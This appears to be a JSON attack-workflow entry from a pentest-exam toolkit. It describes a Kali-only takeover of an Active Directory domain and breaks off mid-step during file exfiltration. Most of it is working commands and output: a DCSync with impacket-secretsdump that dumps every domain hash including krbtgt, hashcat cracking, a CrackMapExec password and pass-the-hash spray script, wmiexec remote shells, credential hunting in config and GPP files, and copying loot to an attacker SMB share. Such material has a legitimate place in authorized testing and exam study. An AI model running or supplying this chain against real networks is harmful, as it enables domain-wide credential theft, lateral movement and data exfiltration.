{
  "id": "ad-dcsync-linux-workflow",
  "name": "DCSync Linux-Only Workflow - Kali-Based Full Domain Compromise",
  "description": "Advanced attack chain for complete Active Directory compromise using only Kali Linux tools (no Windows host required).\n\nExecutes full DCSync attack, credential cracking, lateral movement, and Golden Ticket persistence entirely from Kali using Impacket suite. IDEAL for security assessment scenarios where no Windows access available or Windows AV/EDR blocking tools. RECOMMENDED approach for exam efficiency - all tools pre-installed on Kali, no file transfers needed, no AV concerns.\n\nDETECTION RISK: Medium. Impacket generates same network signatures as native Windows tools (DRSUAPI replication, SMB/RPC traffic), but attacker-side execution means no host-based AV/EDR alerts. All forensic artifacts on DC only (no attacker machine compromise risk).",
  "version": "1.0.0",
  "metadata": {
    "author": "CRACK Development Team - pentest Track",
    "created": "2025-11-23",
    "updated": "2025-11-23",
    "tags": [
      "ACTIVE_DIRECTORY",
      "DCSYNC",
      "LINUX_ONLY",
      "IMPACKET",
      "KALI_LINUX",
      "GOLDEN_TICKET",
      "LATERAL_MOVEMENT",
      "PASS_THE_HASH"
    ],
    "category": "credential-access",
    "platform": "active-directory",
    "references": [
      "https://github.com/fortra/impacket",
      "https://attack.mitre.org/techniques/T1003/006/",
      "https://attack.mitre.org/techniques/T1558/001/",
      "https://www.kali.org/tools/impacket-scripts/",
      "https://web.mit.edu/kerberos/krb5-latest/doc/"
    ]
  },
  "difficulty": "advanced",
  "time_estimate": "90 minutes",
  "prerequisites": [
    "Kali Linux system with Impacket suite installed (default on Kali)",
    "Domain Admin credentials OR Domain User with replication rights",
    "Network access to Domain Controller (SMB 445/tcp, RPC 135/tcp, Kerberos 88/tcp)",
    "Target domain FQDN known (e.g., corp.com)",
    "Hashcat installed on Kali for password cracking"
  ],
  "notes": "LINUX-ONLY STRATEGY: This chain demonstrates COMPLETE Active Directory compromise without touching Windows. EXAM ADVANTAGES: (1) No Windows VM needed (save resources), (2) No AV/EDR bypass required (tools run on Kali), (3) No file transfers between systems (all tools local), (4) Consistent toolset (Impacket API uniformity), (5) Faster execution (no RDP latency). IMPACKET SUITE COVERAGE: secretsdump (DCSync), ticketer (Golden Ticket), psexec/wmiexec/smbexec (lateral movement), GetNPUsers/GetUserSPNs (Kerberoasting/AS-REP roasting), all using same Python library. KERBEROS CONFIGURATION: Critical for Golden Ticket validation - must configure /etc/krb5.conf for ticket operations. EXAM REALITY CHECK: Most pentest AD chains can be solved 100% from Kali - Windows access is convenience, not requirement. DETECTION PROFILE: Network-based detection same as Windows tools (DRSUAPI, SMB, Kerberos), but NO host-based forensics on attacker machine (Python process on Kali vs Mimikatz on Windows). ALTERNATIVE WORKFLOWS: If Impacket unavailable, use native Linux Kerberos tools (kinit, klist, MIT Kerberos) + CrackMapExec + custom scripts.",
  "steps": [
    {
      "id": "configure-kerberos-kali",
      "name": "Configure Kerberos Client on Kali for AD Integration",
      "objective": "Setup Kali Kerberos configuration to interact with Active Directory domain for ticket-based authentication",
      "description": "KERBEROS REQUIREMENT: Impacket Golden Ticket workflow requires proper Kerberos configuration for ticket validation and usage.\n\nKERBEROS CONFIGURATION FILE: /etc/krb5.conf\n\nBACKUP ORIGINAL CONFIG:\ncp /etc/krb5.conf /etc/krb5.conf.bak\n\nCREATE AD-SPECIFIC CONFIG:\nsudo nano /etc/krb5.conf\n\nREQUIRED CONFIGURATION:\n\n[libdefaults]\n    default_realm = CORP.COM\n    dns_lookup_realm = false\n    dns_lookup_kdc = true\n    ticket_lifetime = 24h\n    renew_lifetime = 7d\n    forwardable = true\n    rdns = false\n    default_ccache_name = FILE:/tmp/krb5cc_%{uid}\n\n[realms]\n    CORP.COM = {\n        kdc = dc01.corp.com\n        admin_server = dc01.corp.com\n        default_domain = corp.com\n    }\n\n[domain_realm]\n    .corp.com = CORP.COM\n    corp.com = CORP.COM\n\nCONFIGURATION EXPLANATION:\n\n[libdefaults]\n- default_realm: Primary AD domain (UPPERCASE)\n- dns_lookup_kdc: Auto-discover DCs via DNS SRV records (recommended)\n- ticket_lifetime: TGT validity (24 hours standard)\n- forwardable: Allow ticket forwarding for delegation\n- rdns: Disable reverse DNS (avoid hostname resolution issues)\n\n[realms]\n- kdc: Domain Controller FQDN or IP\n- admin_server: DC for administrative operations (same as kdc typically)\n\n[domain_realm]\n- Maps domain suffixes to Kerberos realms (LOWERCASE domain \u2192 UPPERCASE realm)\n\nDNS CONFIGURATION (Required for dns_lookup_kdc):\n\nAdd DC as nameserver:\nsudo nano /etc/resolv.conf\n\nAdd:\nnameserver 10.10.10.1  # DC IP\nsearch corp.com\n\nOR (permanent via resolvconf):\nsudo nano /etc/resolvconf/resolv.conf.d/head\nnameserver 10.10.10.1\n\nsudo resolvconf -u\n\nVERIFY DNS RESOLUTION:\nnslookup dc01.corp.com\n\nExpected output:\nServer:         10.10.10.1\nAddress:        10.10.10.1#53\n\nName:   dc01.corp.com\nAddress: 10.10.10.1\n\nTEST KERBEROS CONFIGURATION:\n\nTest ticket request (optional - requires valid credentials):\nkinit administrator@CORP.COM\nPassword for administrator@CORP.COM: <enter password>\n\nList tickets:\nklist\n\nExpected output:\nTicket cache: FILE:/tmp/krb5cc_1000\nDefault principal: administrator@CORP.COM\n\nValid starting       Expires              Service principal\n11/23/2025 10:00:00  11/23/2025 20:00:00  krbtgt/CORP.COM@CORP.COM\n\nDESTROY TEST TICKET:\nkdestroy\n(Removes test ticket - will create Golden Ticket later)\n\nTIME SYNCHRONIZATION:\n\nCRITICAL: Kerberos requires <5 minute time difference.\n\nsudo ntpdate dc01.corp.com\nOR\nsudo rdate -n 10.10.10.1\n\nVerify:\ndate\n(Compare with DC time - must be within 5 minutes)\n\nTROUBLESHOOTING:\n\nTest Kerberos connectivity:\ntelnet dc01.corp.com 88\n(Should connect - Kerberos port 88/tcp)\n\nCheck Kerberos logs:\nsudo tail -f /var/log/auth.log\n(Shows Kerberos authentication attempts and errors)\n\nCommon errors:\n- KDC_ERR_C_PRINCIPAL_UNKNOWN: Wrong domain name or user doesn't exist\n- KRB_AP_ERR_SKEW: Time synchronization issue (fix with ntpdate)\n- Cannot resolve KDC: DNS issue (check /etc/resolv.conf)\n\nFILE PERMISSIONS:\n\nsudo chmod 644 /etc/krb5.conf\n(Ensure readable by all users)\n\nTIME ESTIMATE: 5-10 minutes.",
      "command_ref": "ad-dcsync-impacket-secretsdump-user",
      "evidence": [
        "/etc/krb5.conf configured with correct realm and KDC",
        "DNS resolution works for domain FQDNs",
        "Time synchronized within 5 minutes of DC",
        "Test kinit succeeds (if credentials available)",
        "klist shows valid ticket format"
      ],
      "dependencies": [],
      "repeatable": true,
      "success_criteria": [
        "Kerberos configuration file created with correct syntax",
        "Domain Controller resolvable via DNS",
        "Time synchronization within Kerberos tolerance (<5 min)",
        "Test Kerberos operations succeed (if credentials available)"
      ],
      "failure_conditions": [
        "DNS resolution fails (DC FQDN not resolvable)",
        "KRB_AP_ERR_SKEW on kinit test (time sync issue)",
        "Cannot connect to port 88 (Kerberos blocked)",
        "krb5.conf syntax errors (configuration invalid)"
      ],
      "next_steps": [
        "dcsync-full-extraction-impacket"
      ]
    },
    {
      "id": "dcsync-full-extraction-impacket",
      "name": "Execute Full DCSync from Kali with Impacket secretsdump",
      "objective": "Extract all domain credentials including krbtgt hash using Impacket secretsdump entirely from Kali Linux",
      "description": "IMPACKET SECRETSDUMP: Python-based DCSync implementation - functionally identical to Mimikatz lsadump::dcsync but runs on Kali.\n\nFULL DOMAIN DCSYNC COMMAND:\nimpacket-secretsdump -just-dc-ntlm '<DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>' -outputfile domain_dump\n\nExample:\nimpacket-secretsdump -just-dc-ntlm 'corp.com/dave:Password123!@10.10.10.1' -outputfile domain_dump\n\nFLAGS EXPLANATION:\n-just-dc-ntlm: Extract ONLY NTLM hashes (faster, smaller output)\n  Alternative: -just-dc (includes Kerberos keys AES128/AES256 - slower, larger)\n-outputfile domain_dump: Creates domain_dump.ntds file with all hashes\n\nALTERNATIVE: Use FQDN instead of IP (required for Kerberos auth):\nimpacket-secretsdump -just-dc-ntlm 'corp.com/dave:Password123!@dc01.corp.com' -outputfile domain_dump\n\nOUTPUT (Real-time console):\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:a9b30e5b0dc865eadcea9411e4ade72d:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9b30e5b0dc865eadcea9411e4ade72d:::\n              ^^^ THIS IS GOLDEN TICKET KEY - CRITICAL TO SAVE\ndave:1104:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::\nsqlsvc:1125:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\n<...hundreds to thousands more users...>\n[*] Cleaning up...\n\nOUTPUT FILE (domain_dump.ntds):\ncat domain_dump.ntds\n\nFormat: username:RID:LM_hash:NTLM_hash:::\n(Identical format to Windows Mimikatz output - cross-platform compatible)\n\nCRITICAL DATA EXTRACTION:\n\n(1) KRBTGT HASH (For Golden Ticket):\ngrep 'krbtgt:' domain_dump.ntds\n\nOutput:\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9b30e5b0dc865eadcea9411e4ade72d:::\n\nExtract just the NTLM hash:\ngrep 'krbtgt:' domain_dump.ntds | cut -d ':' -f 4\n\nResult: a9b30e5b0dc865eadcea9411e4ade72d\n\nSave to variable:\nKRBTGT_HASH=$(grep 'krbtgt:' domain_dump.ntds | cut -d ':' -f 4)\necho $KRBTGT_HASH\n\n(2) DOMAIN SID (For Golden Ticket):\n\nDomain SID appears in secretsdump output as:\n[*] Domain SID: S-1-5-21-1234567890-1234567890-1234567890\n\nExtract from secretsdump console output OR query separately:\nimpacket-lookupsid 'corp.com/dave:Password123!@10.10.10.1' | grep \"Domain SID\"\n\nOutput:\n[*] Domain SID: S-1-5-21-1234567890-1234567890-1234567890\n\nSave to variable:\nDOMAIN_SID=\"S-1-5-21-1234567890-1234567890-1234567890\"\necho $DOMAIN_SID\n\n(3) HIGH-VALUE USER HASHES:\n\nDomain Admins:\ngrep -i 'administrator\\|admin' domain_dump.ntds > admin_hashes.txt\n\nService accounts:\ngrep -iE 'svc|sql|web|backup|service' domain_dump.ntds > service_hashes.txt\n\nEXTRACT NTLM HASHES FOR HASHCAT:\ncut -d ':' -f 4 domain_dump.ntds > ntlm_hashes.txt\n\nVerify:\nhead -5 ntlm_hashes.txt\n\nExpected output:\na9b30e5b0dc865eadcea9411e4ade72d\n31d6cfe0d16ae931b73c59d7e0c089c0\n08d7a47a6f9f66b97b1bae4178747494\n<...pure NTLM hashes...>\n\nwc -l ntlm_hashes.txt\n(Shows total user count extracted)\n\nEXTRACTION STATISTICS:\n\necho \"[*] DCSync Statistics:\"\necho \"Total users extracted: $(wc -l < domain_dump.ntds)\"\necho \"krbtgt hash: $KRBTGT_HASH\"\necho \"Domain SID: $DOMAIN_SID\"\necho \"Admin accounts: $(wc -l < admin_hashes.txt)\"\necho \"Service accounts: $(wc -l < service_hashes.txt)\"\n\nOPSEC IMPACT (Same as Windows Mimikatz):\n\n- EventID 4662 for each user extracted (hundreds to thousands)\n- DRSUAPI replication traffic from non-DC IP (Kali IP)\n- Large data transfer (500MB-1GB for large domains)\n- Blue team detection: Unusual replication source, sustained replication activity\n\nTIME ESTIMATES:\n- Small domain (50-500 users): 2-5 minutes\n- Medium domain (500-2000 users): 5-15 minutes\n- Large domain (2000-10000 users): 15-60 minutes\n\nFAILURE SCENARIOS:\n\n- ERROR_ACCESS_DENIED: Insufficient replication rights (need DA or DCSync permissions)\n- Connection timeout: Network instability or DC offline\n- KRB_AP_ERR_SKEW: Time sync issue (run sudo ntpdate dc01.corp.com)\n- Cannot resolve DC FQDN: DNS configuration issue (check /etc/resolv.conf)\n\nFAILURE RECOVERY:\n\nIf DCSync interrupted:\n- Partial results saved to domain_dump.ntds (keep file)\n- No resume capability - must restart full extraction\n- Consider targeted extraction if full dump repeatedly fails\n\nADVANTAGES OVER WINDOWS WORKFLOW:\n\n- No AV/EDR bypass needed (Mimikatz triggers every AV)\n- No RDP latency (direct Kali terminal execution)\n- No file transfers (hashes already on Kali for Hashcat)\n- Consistent Python-based toolchain (Impacket suite uniformity)\n\nTIME ESTIMATE: 5-20 minutes (domain size dependent).",
      "command_ref": "ad-dcsync-impacket-secretsdump-user",
      "evidence": [
        "domain_dump.ntds file created with all user hashes",
        "krbtgt hash extracted and saved",
        "Domain SID identified and documented",
        "ntlm_hashes.txt created for Hashcat",
        "admin_hashes.txt and service_hashes.txt created for prioritization"
      ],
      "dependencies": [
        "configure-kerberos-kali"
      ],
      "repeatable": true,
      "success_criteria": [
        "Full DCSync completes without errors",
        "All domain users extracted to file",
        "krbtgt hash and Domain SID documented",
        "Hash files ready for cracking"
      ],
      "failure_conditions": [
        "ERROR_ACCESS_DENIED (no replication rights)",
        "Connection timeout (network or DC unavailable)",
        "KRB_AP_ERR_SKEW (time sync issue)",
        "Partial extraction (incomplete file - retry)"
      ],
      "next_steps": [
        "crack-hashes-kali"
      ]
    },
    {
      "id": "crack-hashes-kali",
      "name": "Batch Crack NTLM Hashes on Kali with Hashcat",
      "objective": "Recover plaintext passwords from extracted NTLM hashes using Kali-based Hashcat cracking",
      "description": "KALI HASHCAT CRACKING: Same process as Windows-based cracking but entirely on Kali (no file transfers needed).\n\nHASHCAT MODE 1000: NTLM hash cracking\n\nVERIFY HASHCAT INSTALLATION:\nhashcat --version\n(Should show v6.2.x or higher on Kali)\n\nATTACK PHASE 1: STRAIGHT DICTIONARY (Baseline - 1-5 minutes)\nhashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt --force\n\n--force: Required on Kali VM (suppresses OpenCL warnings)\n\nExpected: 15-25% crack rate (common weak passwords)\n\nATTACK PHASE 2: RULE-BASED ATTACK (Primary - 10-30 minutes)\nhashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force\n\nRule transformations:\n- password \u2192 Password, PASSWORD, password1, password123, p@ssw0rd, etc.\n\nExpected: 30-50% crack rate (corporate password patterns)\n\nATTACK PHASE 3: CUSTOM WORDLIST (Organization-specific - 5-10 minutes)\n\nCreate custom wordlist:\necho -e \"Corp\\nCorporation\\nCompanyName\\nWelcome\\nPassword\\n2023\\n2024\" > /tmp/custom.txt\n\nCrack with rules:\nhashcat -m 1000 -a 0 ntlm_hashes.txt /tmp/custom.txt -r /usr/share/hashcat/rules/best64.rule --force\n\nExpected: Additional 10-20% crack rate\n\nMONITOR CRACKING PROGRESS:\n\nPress 's' during cracking:\nSpeed.........: 500.0 MH/s (GPU) OR 50.0 MH/s (CPU)\nRecovered.....: 847/2450 (34.57%) Digests\nProgress......: 14344384/14344384 (100.00%)\n\nVIEW CRACKED PASSWORDS:\nhashcat -m 1000 ntlm_hashes.txt --show\n\nOutput (hash:password format):\na9b30e5b0dc865eadcea9411e4ade72d:Password123!\n08d7a47a6f9f66b97b1bae4178747494:Welcome2023\n8846f7eaee8fb117ad06bdd830b7586c:SQLPass2023\n<...hundreds more...>\n\nMAP HASHES TO USERNAMES:\n\nCreate username:password credential file:\nwhile read line; do\n  hash=$(echo $line | cut -d ':' -f 1)\n  pass=$(echo $line | cut -d ':' -f 2-)\n  user=$(grep \"$hash\" domain_dump.ntds | cut -d ':' -f 1)\n  if [ -n \"$user\" ]; then\n    echo \"$user:$pass\"\n  fi\ndone < <(hashcat -m 1000 ntlm_hashes.txt --show) > credentials.txt\n\nResult (credentials.txt):\nAdministrator:Password123!\ndave:Welcome2023\nsqlsvc:SQLPass2023\nwebadmin:IIS2023Web!\nbackup_admin:Backup1!\n<...username:password pairs...>\n\nPRIORITIZE RESULTS:\n\nDomain Admins cracked:\ngrep -f <(net rpc group members \"Domain Admins\" -U 'dave%Password123!' -I 10.10.10.1 2>/dev/null) credentials.txt > domain_admins_cracked.txt\n\nAlternative (if net rpc unavailable):\ngrep -iE 'administrator|admin' credentials.txt > admin_creds.txt\n\nService accounts cracked:\ngrep -iE 'svc|sql|web|backup|service' credentials.txt > service_creds.txt\n\nUNCRACKED HASHES (Still usable for PTH):\n\nIdentify uncracked hashes:\ncomm -23 <(cut -d ':' -f 4 domain_dump.ntds | sort) <(hashcat -m 1000 ntlm_hashes.txt --show | cut -d ':' -f 1 | sort) > uncracked_hashes.txt\n\nMap to usernames:\nfor hash in $(cat uncracked_hashes.txt); do\n  grep \"$hash\" domain_dump.ntds\ndone > uncracked_users.txt\n\nFormat: username:RID:LM:NTLM::: (ready for PTH)\n\nCRACKING STATISTICS:\n\nGenerate summary:\necho \"=== Hashcat Cracking Summary ===\"\necho \"Total hashes: $(wc -l < ntlm_hashes.txt)\"\necho \"Cracked: $(hashcat -m 1000 ntlm_hashes.txt --show | wc -l)\"\necho \"Crack rate: $(hashcat -m 1000 ntlm_hashes.txt --show | wc -l) / $(wc -l < ntlm_hashes.txt) * 100 | bc)%\"\necho \"Uncracked: $(wc -l < uncracked_hashes.txt)\"\necho \"\"\necho \"High-value accounts cracked:\"\ngrep -iE 'administrator|admin|da_' credentials.txt | wc -l\n\nKALI-SPECIFIC OPTIMIZATIONS:\n\nCPU vs GPU:\n- Kali VM (no GPU): Use --force flag, expect ~50 MH/s\n- Physical Kali with GPU: Much faster (~500-5000 MH/s depending on GPU)\n- Check device: hashcat -I (lists OpenCL devices)\n\nMemory issues (large hash files):\n- Split ntlm_hashes.txt into batches:\nsplit -l 1000 ntlm_hashes.txt hash_batch_\n\n- Crack each batch:\nfor batch in hash_batch_*; do\n  hashcat -m 1000 -a 0 $batch /usr/share/wordlists/rockyou.txt --force\ndone\n\nKALI WORDLISTS:\n\nDefault location: /usr/share/wordlists/\n- rockyou.txt (14M passwords - standard)\n- /usr/share/seclists/Passwords/ (additional lists)\n- /usr/share/wordlists/kaonashi.txt (if installed)\n\nDecompress rockyou:\nsudo gunzip /usr/share/wordlists/rockyou.txt.gz\n(If not already decompressed)\n\nTIME ESTIMATE: 15-60 minutes (Phase 1-2 attacks, sufficient for exam).",
      "command_ref": "windows-hashcat-crack-ntlm-file",
      "evidence": [
        "Hashcat completes at least Phase 1-2 attacks",
        "credentials.txt created with username:password pairs",
        "Crack rate >30% achieved",
        "High-value accounts (admins, service accounts) cracked",
        "uncracked_users.txt preserved for PTH"
      ],
      "dependencies": [
        "dcsync-full-extraction-impacket"
      ],
      "repeatable": true,
      "success_criteria": [
        "Minimum 30% crack rate achieved",
        "At least one Domain Admin account cracked (ideal)",
        "Credentials mapped to usernames correctly",
        "Uncracked hashes documented for PTH fallback"
      ],
      "failure_conditions": [
        "Zero cracks after all attacks (strong passwords - rely on PTH)",
        "Hashcat errors (GPU/CPU issues)",
        "Out of memory (need to batch process)",
        "Critical accounts remain uncracked (may need custom wordlist)"
      ],
      "next_steps": [
        "validate-pth-crackmapexec"
      ]
    },
    {
      "id": "validate-pth-crackmapexec",
      "name": "Validate Credentials with CrackMapExec Pass-the-Hash Spray",
      "objective": "Test cracked passwords and uncracked hashes across subnet to identify local admin access using CrackMapExec from Kali",
      "description": "CRACKMAPEXEC: Multi-protocol pentesting tool built for Pass-the-Hash and credential validation (pre-installed on Kali).\n\nVERIFY INSTALLATION:\ncrackmapexec --version\n(Should show v5.x on Kali)\n\nVALIDATION STRATEGY: Test both plaintext passwords AND NTLM hashes against target subnet.\n\nTARGET SUBNET IDENTIFICATION:\n\nFrom initial enumeration:\n- DC: 10.10.10.1\n- Subnet: 10.10.10.0/24\n- Expected domain-joined systems: 10-50 (workstations, servers)\n\nVALIDATION METHOD 1: PASSWORD-BASED SPRAY\n\nTest single user across subnet:\ncrackmapexec smb 10.10.10.0/24 -u dave -p 'Welcome2023' -d corp.com\n\nOutput:\n[+] 10.10.10.75:445 WS01 [+] corp.com\\\\dave:Welcome2023 (Pwn3d!)\n                                                         ^^^^^^^^ LOCAL ADMIN\n[+] 10.10.10.80:445 WS02 [+] corp.com\\\\dave:Welcome2023\n                                                         (no Pwn3d) = Valid, not admin\n\nVALIDATION METHOD 2: HASH-BASED PTH SPRAY\n\nTest with NTLM hash (no password needed):\ncrackmapexec smb 10.10.10.0/24 -u sqlsvc -H '8846f7eaee8fb117ad06bdd830b7586c' -d corp.com\n\nSame output format - PTH works without plaintext.\n\nBATCH VALIDATION SCRIPT (Kali Bash):\n\n#!/bin/bash\nDOMAIN=\"corp.com\"\nSUBNET=\"10.10.10.0/24\"\nOUTPUT=\"validation_results.txt\"\n\necho \"[*] CrackMapExec validation - $(date)\" > $OUTPUT\necho \"\" >> $OUTPUT\n\n# Test cracked passwords\necho \"[*] Testing cracked passwords\" | tee -a $OUTPUT\nwhile IFS=':' read user pass; do\n  echo \"[*] Testing: $user:$pass\" | tee -a $OUTPUT\n  crackmapexec smb $SUBNET -u \"$user\" -p \"$pass\" -d $DOMAIN 2>&1 | tee -a $OUTPUT\n  sleep 1  # Rate limiting\ndone < credentials.txt\n\necho \"\" >> $OUTPUT\n\n# Test uncracked hashes\necho \"[*] Testing uncracked hashes (PTH)\" | tee -a $OUTPUT\nwhile read line; do\n  user=$(echo $line | cut -d ':' -f 1)\n  hash=$(echo $line | cut -d ':' -f 4)\n  echo \"[*] Testing: $user (hash)\" | tee -a $OUTPUT\n  crackmapexec smb $SUBNET -u \"$user\" -H \"$hash\" -d $DOMAIN 2>&1 | tee -a $OUTPUT\n  sleep 1\ndone < uncracked_users.txt\n\necho \"\" >> $OUTPUT\necho \"[*] Extracting Pwn3d! results\" | tee -a $OUTPUT\ngrep \"Pwn3d\" $OUTPUT | tee pwned_systems.txt\n\nEXECUTE VALIDATION:\nchmod +x cme_validate.sh\n./cme_validate.sh\n\nANALYZE RESULTS:\n\nView all compromised systems:\ncat pwned_systems.txt\n\nExpected output:\n[+] 10.10.10.75:445 WS01 [+] corp.com\\\\dave:Welcome2023 (Pwn3d!)\n[+] 10.10.10.100:445 SQL01 [+] corp.com\\\\sqlsvc:8846f7ea... (Pwn3d!)\n[+] 10.10.10.105:445 WEB01 [+] corp.com\\\\webadmin:IIS2023Web! (Pwn3d!)\n[+] 10.10.10.1:445 DC01 [+] corp.com\\\\Administrator:Password123! (Pwn3d!)\n\nCREATE ACCESS MATRIX:\n\nExtract structured data:\ncat pwned_systems.txt | while read line; do\n  ip=$(echo $line | grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+')\n  host=$(echo $line | awk '{print $3}')\n  user=$(echo $line | grep -oP '\\\\\\\\\\K[^:]+' | head -1)\n  echo \"$ip,$host,$user,Local Admin\"\ndone > access_matrix.csv\n\nResult (access_matrix.csv):\n10.10.10.75,WS01,dave,Local Admin\n10.10.10.100,SQL01,sqlsvc,Local Admin\n10.10.10.105,WEB01,webadmin,Local Admin\n10.10.10.1,DC01,Administrator,Local Admin\n\nPRIORITIZE TARGETS:\n\nDomain Controller access:\ngrep 'DC01\\|DC02\\|DC' pwned_systems.txt\n(If found: Domain-wide access confirmed)\n\nDatabase/File servers:\ngrep -iE 'SQL|DB|FILE|SHARE' pwned_systems.txt\n\nTARGET SELECTION FOR LATERAL MOVEMENT:\n\nFrom access_matrix.csv, select:\n1. Domain Controllers (full domain compromise)\n2. Database servers (sensitive data, credential hunting)\n3. File servers (document access)\n4. Admin workstations (additional credentials)\n\nCRACKMAPEXEC ADVANCED FEATURES:\n\nModule execution (enumerate shares):\ncrackmapexec smb 10.10.10.100 -u sqlsvc -p 'SQLPass2023' -d corp.com --shares\n\nOutput:\n[+] 10.10.10.100:445 SQL01 [+] corp.com\\\\sqlsvc:SQLPass2023 (Pwn3d!)\nShare           Permissions     Remark\nADMIN$          READ,WRITE      Remote Admin\nC$              READ,WRITE      Default share\nIPC$            READ            Remote IPC\nBackups         READ,WRITE      SQL Backups\n\nCommand execution:\ncrackmapexec smb 10.10.10.100 -u sqlsvc -p 'SQLPass2023' -d corp.com -x 'whoami'\n\nOutput:\n[+] 10.10.10.100:445 SQL01 [+] corp.com\\\\sqlsvc:SQLPass2023 (Pwn3d!)\ncorp\\\\sqlsvc\n\nDatabase enumeration:\ncrackmapexec mssql 10.10.10.100 -u sqlsvc -p 'SQLPass2023' -d corp.com --query \"SELECT name FROM sys.databases\"\n\nKALI-SPECIFIC NOTES:\n\n- CME fully integrated in Kali (no installation needed)\n- Supports SMB, WinRM, LDAP, MSSQL, SSH, RDP protocols\n- Database mode: Stores results in ~/.cme/workspaces/ (useful for large campaigns)\n- Threading: Use --threads 10 to speed up subnet scans\n\nOPSEC CONSIDERATIONS:\n\n- PTH spray generates EventID 4625 (failed logons) for unsuccessful attempts\n- Successful PTH = EventID 4624 (Logon Type 3 - Network)\n- SIEM detection: Multiple logon attempts from single source IP\n- Rate limiting: Use sleep between attempts to avoid account lockout\n\nFAILURE SCENARIOS:\n\n- Zero Pwn3d! results: Users are standard users (no local admin)\n  \u2192 Try: WinRM protocol (may have different permissions)\n  \u2192 Alternative: Local privilege escalation after shell access\n\n- All STATUS_LOGON_FAILURE: Wrong domain or account lockouts\n  \u2192 Verify: Domain name correct, time synced, accounts not locked\n\n- Connection timeout: SMB port 445 blocked\n  \u2192 Alternative: Try WinRM (port 5985): crackmapexec winrm ...\n\nTIME ESTIMATE: 5-10 minutes for /24 subnet with 10-20 users.",
      "command_ref": "ad-pass-the-hash-crackmapexec",
      "evidence": [
        "validation_results.txt created with all spray results",
        "pwned_systems.txt shows systems with local admin access",
        "access_matrix.csv documents user-to-system mapping",
        "Domain Controller access identified (if DA cracked)",
        "High-value targets prioritized for lateral movement"
      ],
      "dependencies": [
        "crack-hashes-kali"
      ],
      "repeatable": true,
      "success_criteria": [
        "Subnet scan completes successfully",
        "At least one system shows Pwn3d! indicator",
        "Access matrix created with compromised systems",
        "No account lockouts triggered"
      ],
      "failure_conditions": [
        "Zero Pwn3d! results (users lack local admin)",
        "Account lockouts (too aggressive spray)",
        "All STATUS_LOGON_FAILURE (wrong domain or network issues)",
        "SMB port blocked (firewall restriction)"
      ],
      "next_steps": [
        "lateral-movement-impacket"
      ]
    },
    {
      "id": "lateral-movement-impacket",
      "name": "Lateral Movement with Impacket WMIExec from Kali",
      "objective": "Establish shell access on compromised systems using Impacket WMIExec entirely from Kali (no Windows required)",
      "description": "IMPACKET WMIEXEC: Python-based WMI command execution - functionally identical to Windows wmic.exe but runs on Kali.\n\nWMIEXEC vs PSEXEC (Impacket variants):\n- wmiexec: No service creation, no file writes, runs as user (stealthier)\n- psexec: Creates service, writes to ADMIN$, runs as SYSTEM (louder, more privileges)\n\nRECOMMENDATION: Use wmiexec for initial access (stealth), psexec if SYSTEM needed.\n\nIMPACKET WMIEXEC COMMAND:\n\nWith password:\nimpacket-wmiexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'\n\nWith NTLM hash (PTH):\nimpacket-wmiexec -hashes :<NTLM_HASH> '<DOMAIN>/<USERNAME>@<TARGET>'\n\nExample (password):\nimpacket-wmiexec 'corp.com/sqlsvc:SQLPass2023@10.10.10.100'\n\nExample (hash):\nimpacket-wmiexec -hashes :8846f7eaee8fb117ad06bdd830b7586c 'corp.com/sqlsvc@10.10.10.100'\n\nSUCCESSFUL CONNECTION:\n[*] SMBv3.0 dialect used\n[!] Launching semi-interactive shell - Careful what you execute\n[!] Press help for extra shell commands\nC:\\\\>\nwhoami\ncorp\\\\sqlsvc\n       ^^^^^^^^ Runs as authenticated user (NOT SYSTEM like psexec)\n\nhostname\nSQL01\n\nBASIC RECONNAISSANCE:\n\nC:\\\\> whoami /all\n(User privileges, group memberships, SID)\n\nC:\\\\> hostname\n(System name)\n\nC:\\\\> ipconfig\n(Network configuration)\n\nC:\\\\> net user\n(Local users)\n\nC:\\\\> net localgroup Administrators\n(Local admin group members)\n\nTARGET-SPECIFIC ACTIONS:\n\n(1) DATABASE SERVER (SQL01):\n\nC:\\\\> sqlcmd -S localhost -E -Q \"SELECT @@version\"\n(SQL Server version)\n\nC:\\\\> sqlcmd -S localhost -E -Q \"SELECT name FROM sys.databases\"\n(List databases)\n\nC:\\\\> dir \"C:\\\\Program Files\\\\Microsoft SQL Server\\\\\" /s /b\n(Find SQL directories)\n\nCredential hunting:\nC:\\\\> findstr /si password *.config *.xml *.ini C:\\\\*\nC:\\\\> findstr /si connectionstring *.config C:\\\\*\n\n(2) WEB SERVER (WEB01):\n\nC:\\\\> dir C:\\\\inetpub\\\\wwwroot\n(Web root)\n\nC:\\\\> type C:\\\\inetpub\\\\wwwroot\\\\web.config\n(Configuration - often contains DB credentials)\n\nC:\\\\> dir /s /b C:\\\\inetpub\\\\*.config\n(Find all config files)\n\n(3) DOMAIN CONTROLLER (DC01):\n\nC:\\\\> net group \"Domain Admins\" /domain\n(Domain Admin members)\n\nC:\\\\> dir \\\\\\\\localhost\\\\SYSVOL\\\\corp.com\\\\scripts\n(Logon scripts - may contain credentials)\n\nC:\\\\> type \\\\\\\\localhost\\\\SYSVOL\\\\corp.com\\\\Policies\\\\*.xml\n(GPP files - may contain cpassword)\n\nFILE EXFILTRATION FROM KALI:\n\nMethod 1: SMB share access (read files directly):\nimpacket-smbclient -k 'corp.com/sqlsvc:SQLPass2023@10.10.10.100'\n\nsmb: \\\\> use C$\nsmb: \\\\> cd Users\\\\Administrator\\\\Desktop\nsmb: \\\\> get proof.txt\nsmb: \\\\> get local.txt\n\nMethod 2: Setup SMB server on Kali (upload/download files):\nKali: sudo impacket-smbserver -smb2support share /home/kali/loot\n\nTarget (via wmiexec): \nC:\\\\> 